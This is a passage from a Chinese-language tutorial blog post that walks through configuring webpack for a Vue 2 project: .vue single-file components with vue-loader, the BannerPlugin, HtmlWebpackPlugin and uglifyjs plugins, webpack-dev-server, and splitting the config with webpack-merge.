&lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;button @click=&#x27;butClick&#x27;&gt;按钮&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;hello webpack!&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;App /&gt;&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>: &#123;</span><br><span class="line">        <span class="title class_">App</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="抽取对象">抽取对象<a title="#抽取对象" href="#抽取对象"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//App.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;button @click=&#x27;butClick&#x27;&gt;按钮&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;hello webpack!&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.使用Vue进行开发</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./vue/app&#x27;</span>   <span class="comment">//默认导出  不需要大括号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;App /&gt;&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>: &#123;</span><br><span class="line">        <span class="title class_">App</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="分离app.js-的js与模板">分离app.js 的js与模板<a title="#分离app.js-的js与模板" href="#分离app.js-的js与模板"></a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//app.vue</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;title&quot;&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;butClick&quot;&gt;按钮&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;App&quot;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &quot;hello webpack!&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    btnClick() &#123;</span><br><span class="line">      alert();</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.title &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.使用Vue进行开发</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// import App from &#x27;./vue/app&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./vue/app.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;App /&gt;&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>: &#123;</span><br><span class="line">        <span class="title class_">App</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>运行后 会报错 因为使用了.vue文件  要配loader</p><h5 id="配置vue-loader">配置vue-loader<a title="#配置vue-loader" href="#配置vue-loader"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安装 vue-loader  vue-template-compiler</span></span><br><span class="line">npm install vue-loader  vue-template-compiler --save-dev</span><br><span class="line"></span><br><span class="line"><span class="comment">//webpack.config.js配置文件</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">test</span>:<span class="regexp">/\.vue$/</span>,</span><br><span class="line">    <span class="attr">use</span>:[<span class="string">&#x27;vue-loader&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>报错的话 可能是vue-loader版本太高  可以修改低于14的版本  ‘^13.0.0’  然后再终端 npm install 重新下载 然后就可以了</p></blockquote><h5 id="组件化使用">组件化使用<a title="#组件化使用" href="#组件化使用"></a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//Cpn.vue</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;Cpn&quot;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &quot;Cpn组件&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//app.vue</span><br><span class="line">//import Cpn from &quot;./Cpn.vue&quot;;</span><br><span class="line">//注册 组件 compontents: &#123;Cpn,&#125;,</span><br><span class="line">//使用组件  单/双标签 都可 &lt;Cpn&gt;&lt;/Cpn&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;title&quot;&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;butClick&quot;&gt;按钮&lt;/button&gt;</span><br><span class="line">    &lt;Cpn&gt;&lt;/Cpn&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Cpn from &quot;./Cpn.vue&quot;;   </span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;App&quot;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Cpn,</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &quot;hello webpack!&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    btnClick() &#123;</span><br><span class="line">      alert();</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.title &#123;</span><br><span class="line">  color: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><blockquote><p>如果在 import 时想要简写 .vue 什么的 可以在 webpack.config.js  的 resolve添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js </span></span><br><span class="line"> <span class="attr">extensions</span>:[<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.vue&#x27;</span>,<span class="string">&#x27;.css&#x27;</span>]</span><br></pre></td></tr></table></figure></blockquote><h3 id="2.7-横幅plugin的使用">2.7 横幅plugin的使用<a title="#2.7-横幅plugin的使用" href="#2.7-横幅plugin的使用"></a></h3><ol><li>认识plugin</li></ol><ul><li>plugin是插件的意思，通常是用于对某个现有的架构进行扩展</li><li>webpack中的插件，就是对webpack现有功能的各种扩展</li></ul><ol start="2"><li>loader和plugin区别</li></ol><ul><li>loader主要用于转换某些类型的模块，转换器</li><li>plugin是插件，是对webpack本身的扩展，扩展器</li></ul><ol start="3"><li>plugin的使用过程</li></ol><ul><li>步骤一：通过npm安装需要使用的plugins</li><li>步骤二：在webpack.config.js中的plugins中配置文件</li></ul><h4 id="2.7.1-添加版权的plugin">2.7.1 添加版权的plugin<a title="#2.7.1-添加版权的plugin" href="#2.7.1-添加版权的plugin"></a></h4><p>该插件名字BannerPlugin,属于webpack自带的插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加版权的Plugin</span></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>=&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&#x27;最终版权归lsy所有&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进入相应的文件夹 运行 能在 打好包的文件第一行看见 /*! 最终版权归lsy所有 */</span></span><br></pre></td></tr></table></figure><h4 id="2.7.2-打包html的plugin">2.7.2 打包html的plugin<a title="#2.7.2-打包html的plugin" href="#2.7.2-打包html的plugin"></a></h4><ul><li>在开发时，index.html文件是存放在项目根目录下的，但真实发布时，发布的是dist的内容，但是dist没有index.html时，打包文件也就没有意义</li><li>所以需要将html打包到dist中，这时就能用HtmlWebpackPlugin插件</li></ul><p>HtmlWebpackPlugin插件可以：</p><ol><li>自动生成的一个index.html文件 可以指定模板来生成</li><li>将打包的js文件自动通过script标签插入到body</li></ol><p>安装HtmlWebpackPlugin插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install html-webpack-plugin@<span class="number">3.2</span><span class="number">.0</span> --save-dev  <span class="comment">//老师是@3.2.0</span></span><br></pre></td></tr></table></figure><p>修改配置webpack.config.js文件中plugins部分：</p><ul><li>这里的template表示根据什么模板来生成index.html</li><li>需要删除之前在output中添加的publicPath属性</li><li>否则插入script标签中的src可能会有问题</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加打包html的plugin</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="comment">//添加版权</span></span><br><span class="line">        <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&#x27;最终版权归lsy所有&#x27;</span>),</span><br><span class="line">        <span class="comment">//打包html</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>()</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行 发现 在dist中 有index文件：</p><ol><li><p>没有必须的<code>&lt;div id='app'&gt;&lt;/div&gt;</code></p><blockquote><p>建立一个模板  原来的index 即根目录下的index body里只留下 上述代码作为模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再在打包的地方 引入模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>src的地址有错</p><blockquote><p>在webpack.config.js 中注释掉    publicPath: ‘dist/’</p></blockquote><p>再运行就可以了</p></li></ol><h4 id="2.7.3-js压缩的plugin（发布阶段使用）">2.7.3 js压缩的Plugin（发布阶段使用）<a title="#2.7.3-js压缩的plugin（发布阶段使用）" href="#2.7.3-js压缩的plugin（发布阶段使用）"></a></h4><ul><li>在项目发布之前，必然要队js等文件进行压缩处理</li><li>使用第三方插件uglifyjs-webpack-plugin，并且指定版本号，与CLI2保持一致</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install uglifyjs-webpack-plugin@<span class="number">1.1</span><span class="number">.1</span> --save-dev</span><br></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加压缩js的plugin</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UglifyjsWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="comment">//添加版权</span></span><br><span class="line">        <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&#x27;最终版权归lsy所有&#x27;</span>),</span><br><span class="line">        <span class="comment">//打包html</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">template</span>: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="comment">//压缩js文件</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">UglifyjsWebpackPlugin</span>()</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><blockquote><p>但在开发时不建议使用  因为不方便调试代码</p><p>在发布阶段 再加进来</p></blockquote><h3 id="2.8-搭建本地服务器（开发阶段使用）">2.8 搭建本地服务器（开发阶段使用）<a title="#2.8-搭建本地服务器（开发阶段使用）" href="#2.8-搭建本地服务器（开发阶段使用）"></a></h3><ul><li>webpack提供了一个可选的本地开发服务器，这个服务器基于node.js搭建，内部使用express框架，可以实现<strong>让浏览器自动刷新显示修改后的结果</strong></li></ul><p>安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev webpack-dev-server@<span class="number">2.9</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><ul><li>devserver也是作为webpack中的一个选项，选项本身可以设置如下属性：<ul><li>contentBase：为哪一个文件夹提供本地服务，默认是根文件夹，这里填写<code>./dist</code></li><li>port：端口号</li><li>inline：页面实时刷新</li><li>historyApiFallback：在SPA页面中，依赖HTML5的history模式</li></ul></li></ul><p>配置webpack.config.js文件的配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js  与pulgin同级</span></span><br><span class="line">    <span class="comment">//搭建本地服务器</span></span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">        <span class="attr">inline</span>: <span class="literal">true</span>, <span class="comment">//是否实时监听</span></span><br><span class="line">    &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>跑起来 是通过 webpack-dev-server</p><blockquote><p>因为是再局部安装的 所以跑起来 说找不到命令</p><p>所以在终端 应该找本地的 <code>./node_modules/.bin/webpack-dev-server </code></p></blockquote><p>但是有更简洁的方式：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.json</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>终端输入<code>npm run dev</code>  就会出现本地可以运行的地址</p><p>点进去 后修改代码 进去就会发现 页面也刷新了</p><blockquote><p>停止服务  ：<code>ctrl + c </code></p></blockquote><p>停止服务后 可以再次打包 就可以了</p><blockquote><p>因为手动点地址进去可能有点麻烦 ，所以</p><p><code>&quot;dev&quot;: &quot;webpack-dev-server --open&quot;</code></p><p>就会自动打开了</p></blockquote><h3 id="2.9-配置文件的分离">2.9 配置文件的分离<a title="#2.9-配置文件的分离" href="#2.9-配置文件的分离"></a></h3><ul><li><p>因为有些是开发时需要 有些是发布时需要</p><blockquote><p>开发：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//搭建本地服务器</span></span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">        <span class="attr">inline</span>: <span class="literal">true</span>, <span class="comment">//是否实时监听</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生产时：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加压缩js的plugin</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UglifyjsWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="comment">//压缩js文件</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">UglifyjsWebpackPlugin</span>()</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>安装webpack-merge 对两个文件进行合并</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack-merge@<span class="number">4.1</span><span class="number">.5</span> --save-dev</span><br></pre></td></tr></table></figure><ul><li><p>合并文件</p><blockquote><p>生产时：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生产时</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加压缩js的plugin</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UglifyjsWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//合并两个文件</span></span><br><span class="line"><span class="keyword">const</span> webpackMerge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入baseConfig</span></span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">&#x27;./base.config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">webpackMerge</span>(baseConfig, &#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="comment">//压缩js文件</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">UglifyjsWebpackPlugin</span>()</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>开发时：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发时</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//合并两个文件</span></span><br><span class="line"><span class="keyword">const</span> webpackMerge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入baseConfig</span></span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">&#x27;./base.config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">webpackMerge</span>(baseConfig, &#123;</span><br><span class="line"></span><br><span class="line">    <span 